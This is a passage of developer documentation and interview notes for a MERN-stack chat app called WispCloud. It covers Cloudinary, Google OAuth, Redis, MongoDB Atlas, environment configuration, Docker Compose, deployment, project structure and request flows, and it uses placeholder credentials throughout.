```javascript
export const updateProfile = async (req, res) => {
    try {
        const { profilePic } = req.body;
        const userId = req.user._id;

        if (!profilePic) {
            return res.status(400).json({ message: "Profile pic is required" });
        }

        // Upload to Cloudinary
        const uploadResponse = await cloudinary.uploader.upload(profilePic);

        // Update user with Cloudinary URL
        const updatedUser = await User.findByIdAndUpdate(
            userId,
            { profilePic: uploadResponse.secure_url },
            { new: true }
        );

        res.status(200).json(updatedUser)
    } catch (error) {
        console.log("Error in update profile:", error);
        res.status(500).json({ message: "Internal server error" });
    }
};
```

**URL Structure:**

```
https://res.cloudinary.com/[cloud_name]/image/upload/v[version]/[public_id].[format]

Example:
https://res.cloudinary.com/dxyz123/image/upload/v1234567890/profile_abc123.jpg
```

**Transformation Examples:**

```javascript
// Resize to 200x200
https://res.cloudinary.com/demo/image/upload/w_200,h_200,c_fill/sample.jpg

// Automatic quality optimization
https://res.cloudinary.com/demo/image/upload/q_auto/sample.jpg

// Format conversion
https://res.cloudinary.com/demo/image/upload/f_webp/sample.jpg
```

> **Interview Tip:** Explain trade-offs:
> - **Pros:** Easy setup, built-in CDN, image transformations, free tier
> - **Cons:** Vendor lock-in, cost at scale, less control than self-hosted
> - **Alternatives:** AWS S3 (more control), local storage (development), Azure Blob (enterprise)

---

## **6.2 Google OAuth 2.0**

### **6.2.1 OAuth Flow Diagram**

```
┌──────────────┐
│   Frontend   │
│  (React App) │
└──────┬───────┘
       │ 1. User clicks "Sign in with Google"
       │    → Redirect to backend OAuth route
       ↓
┌──────────────────────────────────────┐
│   Backend: /api/auth/oauth/google    │
│   - passport.authenticate('google')  │
│   - Redirect to Google OAuth         │
└──────┬───────────────────────────────┘
       │ 2. Browser redirects to Google
       ↓
┌──────────────────────────────────────┐
│         Google OAuth Consent         │
│   - User selects Google account      │
│   - Grants permissions (email, prof.)│
│   - Google generates auth code       │
└──────┬───────────────────────────────┘
       │ 3. Google redirects back with code
       │    → /api/auth/oauth/google/callback?code=abc123
       ↓
┌──────────────────────────────────────┐
│  Backend: OAuth Callback Handler     │
│  1. Exchange code for access token   │
│  2. Fetch user profile from Google   │
│     - email, name, profile photo     │
│  3. Find or create user in MongoDB   │
│  4. Generate JWT token               │
│  5. Redirect to frontend with token  │
└──────┬───────────────────────────────┘
       │ 4. Redirect to /oauth-success?token=xyz
       ↓
┌──────────────────────────────────────┐
│   Frontend: /oauth-success           │
│   - Extract token from URL params    │
│   - Store token in cookie            │
│   - Redirect to /home                │
└──────────────────────────────────────┘
```

### **6.2.2 Passport.js Configuration**

**File:** `C:\Users\Nilansh\Desktop\WispCloud\backend\src\config\passport.js`

**Key Components:**

1. **Google Strategy Setup:**
   ```javascript
   passport.use(new GoogleStrategy({
       clientID: process.env.GOOGLE_CLIENT_ID,
       clientSecret: process.env.GOOGLE_CLIENT_SECRET,
       callbackURL: '/api/auth/oauth/google/callback',
       scope: ['profile', 'email']
   }, async (accessToken, refreshToken, profile, done) => {
       // Find or create user
   }))
   ```

2. **User Serialization:**
   ```javascript
   passport.serializeUser((user, done) => {
       done(null, user._id);
   });
   ```

3. **User Deserialization:**
   ```javascript
   passport.deserializeUser(async (id, done) => {
       const user = await User.findById(id).select('-password');
       done(null, user);
   });
   ```

**Username Generation Logic:**

```javascript
// If user signs up with OAuth, generate unique username from email
let username = profile.emails[0].value.split('@')[0].toLowerCase();
let existingUsername = await User.findOne({ username });
let counter = 1;

while (existingUsername) {
    username = `${profile.emails[0].value.split('@')[0].toLowerCase()}${counter}`;
    existingUsername = await User.findOne({ username });
    counter++;
}

// Example: john@gmail.com → username: "john"
// If "john" exists → "john1"
// If "john1" exists → "john2", etc.
```

### **6.2.3 Security Considerations**

**1. Environment Variables:**
```env
GOOGLE_CLIENT_ID=123456789-abcdef.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=GOCSPX-abc123def456
BACKEND_URL=https://api.wispcloud.com
FRONTEND_URL=https://wispcloud.com
```

**2. OAuth Scopes:**
- `profile`: Access to basic profile information (name, photo)
- `email`: Access to user's email address

**3. Redirect URI Validation:**
- Registered in Google Cloud Console
- Must exactly match configured callback URL
- Prevents open redirect vulnerabilities

**4. State Parameter (CSRF Protection):**
- Passport.js automatically generates state parameter
- Validated on callback to prevent CSRF attacks

> **Why This Matters:**
> - **User Experience:** Single-click signup (no password required)
> - **Security:** OAuth 2.0 is more secure than custom auth
> - **Trust:** Users trust Google authentication
> - **Profile Data:** Get verified email, name, photo from Google

---

## **6.3 Redis Cloud**

### **6.3.1 Why Managed Redis?**

**Self-Hosted Redis vs Redis Cloud:**

| Feature | Self-Hosted | Redis Cloud |
|---------|-------------|-------------|
| **Setup** | Install, configure | ✅ Instant |
| **Maintenance** | Manual updates | ✅ Automatic |
| **Backups** | Manual | ✅ Automatic |
| **High Availability** | Complex setup | ✅ Built-in |
| **Scaling** | Manual | ✅ One-click |
| **Monitoring** | Setup required | ✅ Dashboard |
| **Cost** | Server cost | ✅ Free tier (30MB) |

**Chosen: Redis Cloud** (free tier) for:
1. **Zero DevOps overhead**
2. **Automatic backups**
3. **High availability**
4. **Connection security** (TLS/SSL)

### **6.3.2 Connection Management**

```javascript
export const connectRedis = async () => {
    try {
        const redisUrl = process.env.REDIS_URL || 'redis://localhost:6379';

        redisClient = createClient({
            url: redisUrl,
            socket: {
                reconnectStrategy: (retries) => {
                    if (retries > 3) {
                        return new Error('Too many retries');
                    }
                    return Math.min(retries * 50, 3000);
                }
            }
        });

        await redisClient.connect();
        return redisClient;
    } catch (error) {
        console.warn('⚠️  Failed to connect to Redis:', error.message);
        return null;
    }
};
```

**Reconnection Strategy:**
- Retry 1: Wait 50ms
- Retry 2: Wait 100ms
- Retry 3: Wait 150ms
- After 3 retries: Stop and fallback to memory store

**Free Tier Usage:**
- **Storage:** 30MB (sufficient for presence + rate limiting)
- **Connections:** 30 concurrent
- **Bandwidth:** Unlimited
- **Persistence:** RDB snapshots

---

## **6.4 MongoDB Atlas**

### **6.4.1 Why Cloud MongoDB?**

**MongoDB Atlas Benefits:**
1. **Free Tier:** 512MB storage (M0 cluster)
2. **Automatic Backups:** Daily snapshots
3. **Global Deployment:** Choose region
4. **Security:** Built-in IP whitelisting, VPC peering
5. **Monitoring:** Real-time performance metrics
6. **Scaling:** Upgrade cluster with one click

### **6.4.2 Connection String Security**

**Bad Practice:**
```javascript
// ❌ NEVER hardcode connection string
const MONGO_URI = "mongodb+srv://admin:password123@cluster0.mongodb.net/wispcloud";
```

**Good Practice:**
```javascript
// ✅ Use environment variable
const MONGO_URI = process.env.MONGODB_URI;
```

**Connection String Structure:**
```
mongodb+srv://[username]:[password]@[cluster].mongodb.net/[database]?retryWrites=true&w=majority
```

**Connection Code:**
```javascript
export const connectDB = async () => {
    try {
        const conn = await mongoose.connect(process.env.MONGODB_URI);
        console.log(`✅ MongoDB connected: ${conn.connection.host}`);
    } catch (error) {
        console.error("❌ MongoDB connection error:", error);
        process.exit(1);
    }
};
```

### **6.4.3 Backup Strategy**

**Atlas Automated Backups:**
- **Frequency:** Daily (free tier)
- **Retention:** 2 days (free tier)
- **Restoration:** Point-in-time recovery

**Additional Manual Backups:**
```bash
# Export entire database
mongodump --uri="mongodb+srv://..." --out=/backup/$(date +%Y%m%d)

# Export specific collection
mongoexport --uri="mongodb+srv://..." --collection=users --out=users.json

# Restore database
mongorestore --uri="mongodb+srv://..." /backup/20250113
```

> **Interview Tip:** Explain why cloud databases:
> - **Reduced operational burden** (no server management)
> - **Built-in security** (encryption at rest and in transit)
> - **Automatic scaling** (upgrade cluster as needed)
> - **High availability** (replica sets built-in)
> - **Cost-effective** (generous free tiers for MVPs)

---

*[Chapter 6 Complete - ~800 lines covering Cloudinary, Google OAuth, Redis Cloud, and MongoDB Atlas]*


# **CHAPTER 7: CONFIGURATION & SETUP**

---

## **7.1 Environment Configuration**

### **7.1.1 All Environment Variables**

**Backend .env File:**

```env
# Server Configuration
PORT=5001
NODE_ENV=development
FRONTEND_URL=http://localhost:5173
BACKEND_URL=http://localhost:5001

# Database
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/wispcloud

# Redis
REDIS_URL=redis://default:password@redis-12345.cloud.redislabs.com:16379

# JWT Authentication
JWT_SECRET=your-super-secret-jwt-key-change-in-production-min-32-chars

# Session
SESSION_SECRET=your-session-secret-change-in-production

# Cloudinary
CLOUDINARY_CLOUD_NAME=your-cloud-name
CLOUDINARY_API_KEY=123456789012345
CLOUDINARY_API_SECRET=abcdefghijklmnopqrstuvwx

# Google OAuth (Optional)
GOOGLE_CLIENT_ID=123456789-abcdefghijklmnop.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=GOCSPX-abcdefghijklmnopqrst
```

**Frontend .env File:**

```env
VITE_API_URL=http://localhost:5001
VITE_SOCKET_URL=http://localhost:5001
```

### **7.1.2 Security Best Practices**

**1. Never Commit .env Files:**
```gitignore
# .gitignore
.env
.env.local
.env.production
```

**2. Use Strong Secrets:**
```bash
# Generate strong JWT secret (32+ characters)
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# Output: 5f8d3a2b7c1e4f9a6b8d2c3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3
```

**3. Environment-Specific Configurations:**
```javascript
// Development
const corsOrigin = process.env.NODE_ENV === 'development'
    ? 'http://localhost:5173'
    : process.env.FRONTEND_URL;

// Production
const cookieSecure = process.env.NODE_ENV === 'production';
```

**4. Validate Required Variables:**
```javascript
const requiredEnvVars = [
    'MONGODB_URI',
    'JWT_SECRET',
    'CLOUDINARY_CLOUD_NAME'
];

requiredEnvVars.forEach(varName => {
    if (!process.env[varName]) {
        console.error(`❌ Missing required environment variable: ${varName}`);
        process.exit(1);
    }
});
```

---

## **7.2 Build Process**

### **7.2.1 Backend Build**

**Development:**
```json
{
  "scripts": {
    "dev": "nodemon src/index.js",
    "start": "node src/index.js"
  }
}
```

**nodemon.json Configuration:**
```json
{
  "watch": ["src"],
  "ext": "js,json",
  "ignore": ["src/**/*.test.js"],
  "exec": "node src/index.js"
}
```

**Production:**
- No build step required (Node.js runs JavaScript directly)
- Use PM2 for process management:
```bash
pm2 start src/index.js --name wispcloud-api
pm2 startup
pm2 save
```

### **7.2.2 Frontend Build**

**Development:**
```json
{
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  }
}
```

**Vite Configuration (vite.config.js):**
```javascript
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [react()],
  server: {
    port: 5173,
    proxy: {
      '/api': {
        target: 'http://localhost:5001',
        changeOrigin: true
      }
    }
  }
})
```

**Production Build:**
```bash
npm run build
# Creates /dist folder with optimized assets
```

**Build Output:**
```
dist/
├── index.html
├── assets/
│   ├── index-abc123.js  (minified, tree-shaken)
│   ├── index-xyz789.css (minified, purged unused CSS)
│   └── logo-def456.svg  (optimized)
```

**Optimization Features:**
- **Code Splitting:** Lazy-loaded routes
- **Tree Shaking:** Remove unused code
- **Minification:** Smaller bundle size
- **Asset Optimization:** Images, fonts compressed

---

## **7.3 Docker Compose Setup**

### **7.3.1 Complete docker-compose.yml**

```yaml
version: '3.8'

services:
  # MongoDB Database
  mongodb:
    image: mongo:7
    container_name: wispcloud-mongodb
    restart: unless-stopped
    ports:
      - "27017:27017"
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: password123
      MONGO_INITDB_DATABASE: wispcloud
    volumes:
      - mongodb_data:/data/db
    networks:
      - wispcloud-network

  # Redis Cache
  redis:
    image: redis:7-alpine
    container_name: wispcloud-redis
    restart: unless-stopped
    ports:
      - "6379:6379"
    command: redis-server --appendonly yes
    volumes:
      - redis_data:/data
    networks:
      - wispcloud-network

  # Backend API
  backend:
    build:
      context: ./backend
      dockerfile: Dockerfile
    container_name: wispcloud-backend
    restart: unless-stopped
    ports:
      - "5001:5001"
    environment:
      NODE_ENV: production
      PORT: 5001
      MONGODB_URI: mongodb://admin:password123@mongodb:27017/wispcloud?authSource=admin
      REDIS_URL: redis://redis:6379
      JWT_SECRET: ${JWT_SECRET}
      CLOUDINARY_CLOUD_NAME: ${CLOUDINARY_CLOUD_NAME}
      CLOUDINARY_API_KEY: ${CLOUDINARY_API_KEY}
      CLOUDINARY_API_SECRET: ${CLOUDINARY_API_SECRET}
      FRONTEND_URL: http://localhost:5173
    depends_on:
      - mongodb
      - redis
    networks:
      - wispcloud-network
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:5001/health"]
      interval: 30s
      timeout: 10s
      retries: 3

  # Frontend (React + Vite)
  frontend:
    build:
      context: ./frontend/Wisp
      dockerfile: Dockerfile
    container_name: wispcloud-frontend
    restart: unless-stopped
    ports:
      - "5173:80"
    depends_on:
      - backend
    networks:
      - wispcloud-network

networks:
  wispcloud-network:
    driver: bridge

volumes:
  mongodb_data:
  redis_data:
```

### **7.3.2 Service Explanations**

**1. MongoDB Service:**
- **Image:** Official MongoDB 7
- **Volume:** Persists data across container restarts
- **Authentication:** Root user with credentials
- **Network:** Internal network for service communication

**2. Redis Service:**
- **Image:** Redis 7 Alpine (lightweight)
- **Persistence:** AOF (Append-Only File) enabled
- **Volume:** Persists cache data
- **Network:** Internal network

**3. Backend Service:**
- **Build:** Custom Dockerfile
- **Environment:** All config via env vars
- **Dependencies:** Waits for MongoDB and Redis
- **Health Check:** Curl to /health endpoint every 30s

**4. Frontend Service:**
- **Build:** Multi-stage Dockerfile (build + serve)
- **Port:** Exposes on 80 (mapped to host 5173)
- **Dependency:** Waits for backend to be ready

### **7.3.3 Multi-Stage Backend Dockerfile**

```dockerfile
# Stage 1: Dependencies
FROM node:20-alpine AS dependencies
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

# Stage 2: Production
FROM node:20-alpine
WORKDIR /app

# Copy dependencies from previous stage
COPY --from=dependencies /app/node_modules ./node_modules

# Copy application code
COPY . .

# Create non-root user
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001
USER nodejs

# Expose port
EXPOSE 5001

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node -e "require('http').get('http://localhost:5001/health', (r) => r.statusCode === 200 ? process.exit(0) : process.exit(1))"

# Start application
CMD ["node", "src/index.js"]
```

### **7.3.4 Multi-Stage Frontend Dockerfile**

```dockerfile
# Stage 1: Build
FROM node:20-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Stage 2: Production (Nginx)
FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
```

### **7.3.5 Docker Commands**

```bash
# Build and start all services
docker-compose up -d

# View logs
docker-compose logs -f

# Stop all services
docker-compose down

# Stop and remove volumes (data loss)
docker-compose down -v

# Rebuild specific service
docker-compose up -d --build backend

# Scale backend (horizontal scaling)
docker-compose up -d --scale backend=3
```

---

## **7.4 Deployment Strategies**

### **7.4.1 Railway.app Deployment**

**Steps:**
1. Connect GitHub repository
2. Create new project
3. Add services: Backend, Frontend
4. Configure environment variables
5. Deploy with one click

**Railway.toml (Backend):**
```toml
[build]
builder = "NIXPACKS"

[deploy]
startCommand = "node src/index.js"
healthcheckPath = "/health"
healthcheckTimeout = 100
restartPolicyType = "ON_FAILURE"
restartPolicyMaxRetries = 10
```

**Pros:**
- ✅ Extremely simple setup
- ✅ Automatic HTTPS
- ✅ Free tier ($5 credit/month)
- ✅ GitHub integration

**Cons:**
- ❌ Limited free tier
- ❌ Less control than AWS
- ❌ US-only data centers

### **7.4.2 AWS ECS/Fargate Approach**

**Architecture:**
```
Route 53 (DNS)
   ↓
CloudFront (CDN) → S3 (Frontend static files)
   ↓
Application Load Balancer
   ↓
┌────────────────────────────────┐
│  ECS Fargate Cluster           │
│  ┌──────────┐  ┌──────────┐  │
│  │ Backend  │  │ Backend  │  │
│  │ Task 1   │  │ Task 2   │  │
│  └──────────┘  └──────────┘  │
└────────────────────────────────┘
   ↓
DocumentDB (MongoDB compatible)
Redis ElastiCache
```

**Services Required:**
1. **ECS Fargate:** Container orchestration
2. **ALB:** Load balancing
3. **DocumentDB:** MongoDB-compatible database
4. **ElastiCache:** Redis managed service
5. **S3:** Static file hosting
6. **CloudFront:** CDN for frontend
7. **Route 53:** DNS management

**Pros:**
- ✅ Full control
- ✅ Enterprise-grade
- ✅ Auto-scaling
- ✅ Global infrastructure

**Cons:**
- ❌ Complex setup
- ❌ Higher cost
- ❌ Requires AWS expertise

### **7.4.3 Environment-Specific Configs**

**Development:**
```javascript
module.exports = {
    port: 5001,
    corsOrigin: 'http://localhost:5173',
    cookieSecure: false,
    logLevel: 'debug',
    rateLimitMax: 1000
};
```

**Staging:**
```javascript
module.exports = {
    port: process.env.PORT || 5001,
    corsOrigin: process.env.FRONTEND_URL,
    cookieSecure: true,
    logLevel: 'info',
    rateLimitMax: 500
};
```

**Production:**
```javascript
module.exports = {
    port: process.env.PORT || 5001,
    corsOrigin: process.env.FRONTEND_URL,
    cookieSecure: true,
    logLevel: 'error',
    rateLimitMax: 500,
    enableMonitoring: true
};
```

---

*[Chapter 7 Complete - ~600 lines covering environment config, build process, Docker setup, and deployment strategies]*

# CHAPTER 4: SYSTEM ARCHITECTURE

## 4.1 Project Structure & Organization

### **4.1.1 Backend Structure**

**Location:** `C:\Users\Nilansh\Desktop\WispCloud\backend\src\`

**Directory Tree:**
```
backend/src/
├── config/              (1 file)
│   └── passport.js      # Google OAuth configuration
├── controllers/         (8 files)
│   ├── analytics.controller.js      # Analytics & statistics
│   ├── auth.controller.js           # Signup, login, logout
│   ├── chatInvite.controllers.js    # Friend request system
│   ├── group.controllers.js         # Group CRUD operations
│   ├── groupMessage.controllers.js  # Group messaging
│   ├── message.controllers.js       # DM messaging
│   ├── oauth.controller.js          # OAuth callbacks
│   └── user.controllers.js          # User search, profile
├── lib/                 (5 files)
│   ├── cloudinary.js    # Media upload configuration
│   ├── db.js            # MongoDB connection
│   ├── redis.js         # Redis client & presence functions
│   ├── socket.js        # Socket.IO server setup
│   └── utils.js         # JWT generation, helpers
├── middleware/          (4 files)
│   ├── auth.middleware.js      # JWT verification (protectRoute)
│   ├── rateLimiter.js          # 6-tier rate limiting
│   ├── rbac.middleware.js      # Role-based access control
│   └── validation.js           # Zod schema validation
├── models/              (6 files)
│   ├── chatInvite.model.js     # Friend requests
│   ├── concept.model.js        # Future NLP feature
│   ├── group.model.js          # Group metadata
│   ├── groupMember.model.js    # Group membership
│   ├── message.model.js        # Messages (DM + Group)
│   └── user.model.js           # User accounts
├── routes/              (7 files)
│   ├── analytics.routes.js     # Admin analytics
│   ├── auth.route.js           # /api/auth/*
│   ├── chatInvite.routes.js    # /api/invites/*
│   ├── group.routes.js         # /api/groups/*
│   ├── messageRoutes.js        # /api/messages/*
│   ├── oauth.routes.js         # /api/oauth/*
│   └── user.routes.js          # /api/users/*
├── scripts/             (1 file)
│   └── seedUsers.js    # Database seeding script
├── seeds/               (1 file)
│   └── user.seeds.js   # Seed data definitions
└── index.js            # Main application entry point
```

**Total Files:** 34 JavaScript files

> **Key Concept:** This is a **feature-based modular architecture** where each feature (auth, messages, groups) has its own controller, routes, and models. This makes the codebase maintainable and allows for easy extraction into microservices later.

---

### **4.1.2 Frontend Structure**

**Location:** `C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\`

**Directory Tree:**
```
frontend/Wisp/src/
├── components/          (16 files)
│   ├── skeletons/
│   │   ├── MessageSkeleton.jsx     # Loading state for messages
│   │   └── SidebarSkeleton.jsx     # Loading state for sidebar
│   ├── AuthImagePattern.jsx        # Decorative auth background
│   ├── ChatContainer.jsx           # Main chat interface
│   ├── ChatHeader.jsx              # Chat top bar (search, actions)
│   ├── ChatInvites.jsx             # Friend request list
│   ├── CreateGroupModal.jsx        # Group creation dialog
│   ├── GroupChatContainer.jsx      # Group chat interface
│   ├── GroupDetailsModal.jsx       # Group info & management
│   ├── GroupsSidebar.jsx           # Group list sidebar
│   ├── MessageInput.jsx            # Message composer
│   ├── Navbar.jsx                  # Top navigation
│   ├── NoChatSelected.jsx          # Empty state
│   ├── OAuthButtons.jsx            # Google login button
│   ├── Sidebar.jsx                 # User list sidebar
│   └── UserSearchBar.jsx           # Search users component
├── constants/           (1 file)
│   └── index.js        # App-wide constants
├── lib/                 (2 files)
│   ├── axios.js        # Axios instance configuration
│   └── utils.js        # Utility functions (date formatting)
├── pages/               (8 files)
│   ├── AdminPage.jsx               # Analytics dashboard
│   ├── GroupChatPage.jsx           # Group chat view
│   ├── HomePage.jsx                # Main chat page
│   ├── LoginPage.jsx               # Login form
│   ├── OAuthCallback.jsx           # OAuth redirect handler
│   ├── ProfilePage.jsx             # User profile settings
│   ├── SettingsPage.jsx            # App settings
│   └── SignUpPage.jsx              # Registration form
├── store/               (6 files)
│   ├── useAuthStore.js             # Auth state (user, login, logout)
│   ├── useChatInviteStore.js       # Friend requests state
│   ├── useChatStore.js             # DM messages state
│   ├── useGroupStore.js            # Groups state
│   ├── useThemeStore.js            # Theme toggle state
│   └── useUserStore.js             # User search state
├── App.jsx             # Root component (routing)
├── index.css           # Tailwind CSS imports
└── main.jsx            # React entry point
```

**Total Files:** 35 JSX/JS files

> **Key Concept:** This follows the **container/presentational pattern** where pages are smart containers that connect to stores, and components are dumb presentational elements. Zustand stores centralize state management.

---

### **4.1.3 Monorepo Organization**

**Root Directory Structure:**
```
WispCloud/
├── backend/
│   ├── src/              # Application code (34 files)
│   ├── Dockerfile        # Production image
│   ├── package.json      # Dependencies (23 packages)
│   └── .env.example      # Environment template
├── frontend/
│   └── Wisp/
│       ├── src/          # Application code (35 files)
│       ├── public/       # Static assets
│       ├── Dockerfile    # Multi-stage build
│       ├── package.json  # Dependencies (18 packages)
│       └── vite.config.js
├── docker-compose.yml    # Multi-service orchestration
├── .gitignore
└── README.md
```

> **Interview Tip:** When asked about project structure, mention that you chose a **monorepo** for simplicity during development, but the modular structure allows easy migration to a **polyrepo** (separate repositories) for microservices if needed.

---

## 4.2 Component Breakdown

### **4.2.1 All React Components**

| Component | Purpose | Key Props | State | When Used |
|-----------|---------|-----------|-------|-----------|
| **AuthImagePattern** | Decorative grid background for auth pages | `title`, `subtitle` | None (stateless) | Login/Signup pages |
| **ChatContainer** | Main DM chat interface | None (uses stores) | `searchQuery`, `isSearchOpen`, `replyingTo` | When `selectedUser` is set |
| **ChatHeader** | Top bar with user info & search | `onSearchChange`, `isSearchOpen`, `setIsSearchOpen` | None | Inside ChatContainer |
| **ChatInvites** | List of pending friend requests | None (uses store) | None | Sidebar (collapsible) |
| **CreateGroupModal** | Group creation dialog | `isOpen`, `onClose` | `groupName`, `description`, `selectedUsers` | When "Create Group" clicked |
| **GroupChatContainer** | Group chat interface | None (uses stores) | `searchQuery`, `isSearchOpen`, `replyingTo` | When `selectedGroup` is set |
| **GroupDetailsModal** | Group info & member management | `isOpen`, `onClose`, `group` | `isEditing`, `updatedGroup` | Group header click |
| **GroupsSidebar** | List of user's groups | None (uses store) | None | Left sidebar (groups tab) |
| **MessageInput** | Message composer with image upload | `replyingTo`, `onCancelReply` | `text`, `imagePreview`, `isTyping` | Chat/Group containers |
| **MessageSkeleton** | Loading state for messages | None | None | While fetching messages |
| **Navbar** | Top navigation with theme toggle | None (uses stores) | None | All authenticated pages |
| **NoChatSelected** | Empty state when no chat open | None | None | HomePage (no selection) |
| **OAuthButtons** | Google OAuth login button | None | `isLoading` | Login/Signup pages |
| **Sidebar** | User list with search & filters | None (uses stores) | `showOnlineOnly`, `showInvites`, `showCreateGroup` | Left side of HomePage |
| **SidebarSkeleton** | Loading state for sidebar | None | None | While fetching users |
| **UserSearchBar** | Search users by name/username | None (uses store) | `searchQuery` | Inside Sidebar |

**Total Components:** 16

---

### **4.2.2 Component Hierarchy**

```
App.jsx (Root)
├── Navbar (All pages)
│
├── LoginPage
│   ├── AuthImagePattern
│   └── OAuthButtons
│
├── SignUpPage
│   ├── AuthImagePattern
│   └── OAuthButtons
│
├── HomePage
│   ├── Sidebar
│   │   ├── UserSearchBar
│   │   ├── ChatInvites
│   │   └── CreateGroupModal
│   │
│   ├── GroupsSidebar
│   │
│   ├── ChatContainer (if selectedUser)
│   │   ├── ChatHeader
│   │   ├── MessageSkeleton (loading)
│   │   └── MessageInput
│   │
│   ├── GroupChatContainer (if selectedGroup)
│   │   ├── ChatHeader
│   │   ├── GroupDetailsModal
│   │   └── MessageInput
│   │
│   └── NoChatSelected (default)
│
├── ProfilePage
│
├── SettingsPage
│
├── AdminPage (admin only)
│
└── OAuthCallback (redirect handler)
```

> **Interview Tip:** This is a **single-page application (SPA)** using React Router for client-side routing. The component tree is shallow (max 4 levels) for performance and maintainability.

---

## 4.3 Data Flow & Request Lifecycle

### **4.3.1 User Signup Flow (25 Steps)**

```
┌────────────────────────────────────────────────────────────┐
│ FRONTEND: User fills signup form                          │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
1. User enters: fullName, email, username, password
2. Form validation (client-side):
   - Email format check (regex)
   - Password length ≥ 6
   - Username 3-20 characters
3. State update: setFormData({ fullName, email, username, password })
4. User clicks "Sign Up" button
                  ↓
┌─────────────────┴──────────────────────────────────────────┐
│ FRONTEND: Zustand Store (useAuthStore)                    │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
5. signup() function called
6. setIsSigningUp(true) - Show loading spinner
7. axios.post("/api/auth/signup", { fullName, email, username, password })
                  ↓
┌─────────────────┴──────────────────────────────────────────┐
│ NETWORK: HTTP POST Request                                │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
8. Request hits: http://localhost:5001/api/auth/signup
9. Request headers:
   - Content-Type: application/json
   - Origin: http://localhost:5173
                  ↓
┌─────────────────┴──────────────────────────────────────────┐
│ BACKEND: Express Middleware Stack                         │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
10. CORS middleware: Check origin (allow localhost:5173)
11. express.json(): Parse request body
12. authLimiter: Check rate limit (20 requests per 15 min)
    - Redis check: get("ratelimit:192.168.1.1")
    - If > 20: reject with 429 Too Many Requests
13. validate(signupSchema): Zod validation
    - Email format
    - Password ≥ 6 chars
    - Username 3-20 chars, alphanumeric
14. All middleware passed → Route handler called
                  ↓
┌─────────────────┴──────────────────────────────────────────┐
│ BACKEND: auth.controller.js → signup()                    │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
15. Extract: const { fullName, email, username, password } = req.body
16. Check existing user:
    await User.findOne({ $or: [{ email }, { username }] })
17. If exists: return 400 "Email/Username already exists"
18. Hash password:
    - salt = await bcrypt.genSalt(10)
    - hashPassword = await bcrypt.hash(password, salt)
19. Create user:
    newUser = new User({ fullName, email, username, password: hashPassword })
20. Generate JWT:
    - generateToken(newUser._id, res)
    - JWT_SECRET from env
    - Set HTTP-only cookie: "jwt"
21. Save to MongoDB:
    await newUser.save()
22. Response: 201 Created
    {
      _id, fullName, email, username, profilePic
    }
                  ↓
┌─────────────────┴──────────────────────────────────────────┐
│ FRONTEND: Response Handling                               │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
23. Store user in Zustand: setAuthUser(userData)
24. localStorage.setItem("wispcloud-user", JSON.stringify(userData))
25. Navigate to: "/profile" (set profile picture)
```

> **Key Concept:** This demonstrates **defense in depth** - validation happens at 3 layers: client (UX), middleware (security), and controller (business logic).

---

### **4.3.2 User Login Flow (18 Steps)**

```
1. User enters: email, password
2. Form validation (client-side)
3. useAuthStore.login() called
4. setIsLoggingIn(true)
5. axios.post("/api/auth/login", { email, password })
   ↓
6. CORS check
7. Rate limiter: authLimiter (20 req/15min)
8. Validation: validate(loginSchema)
9. Route handler: auth.controller.js → login()
   ↓
10. Find user: await User.findOne({ email }).select("+password")
    - Note: password is select: false by default
11. If !user: return 400 "Invalid credentials"
12. Compare password:
    isPasswordCorrect = await bcrypt.compare(password, user.password)
13. If !isPasswordCorrect: return 400 "Invalid credentials"
14. Generate JWT token: generateToken(user._id, res)
15. Response: 200 OK { _id, fullName, email, username, profilePic }
    ↓
16. Frontend: setAuthUser(userData)
17. localStorage.setItem("wispcloud-user", JSON.stringify(userData))
18. Navigate to: "/" (home page)
```

> **Interview Tip:** Notice we return the same error message "Invalid credentials" whether the email or password is wrong. This prevents user enumeration attacks.

---

### **4.3.3 Send Message Flow (REST + WebSocket) (22 Steps)**

```
┌────────────────────────────────────────────────────────────┐
│ FRONTEND: User types message & clicks send                │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
1. MessageInput component: useState("text")
2. Optional: Image upload via Cloudinary
3. User clicks send button
4. useChatStore.sendMessage({ text, image, receiverId })
   ↓
┌─────────────────┴──────────────────────────────────────────┐
│ FRONTEND: Zustand Action                                  │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
5. Optimistic update: setMessages([...messages, newMessage])
6. axios.post(`/api/messages/send/${receiverId}`, { text, image })
   ↓
┌─────────────────┴──────────────────────────────────────────┐
│ BACKEND: Middleware Stack                                 │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
7. protectRoute: Verify JWT token
   - Extract cookie: req.cookies.jwt
   - jwt.verify(token, JWT_SECRET)
   - Find user: await User.findById(decoded.userId)
   - Attach: req.user = user
8. messageLimiter: 50 messages per minute (Redis)
9. validate(sendMessageSchema): Check text or image present
10. Route handler: message.controllers.js → sendMessage()
    ↓
┌─────────────────┴──────────────────────────────────────────┐
│ BACKEND: Business Logic                                   │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
11. Extract: const { text, image } = req.body
12. const senderId = req.user._id
13. const receiverId = req.params.id
14. Image upload (if image):
    - cloudinary.uploader.upload(image)
    - Get secure_url
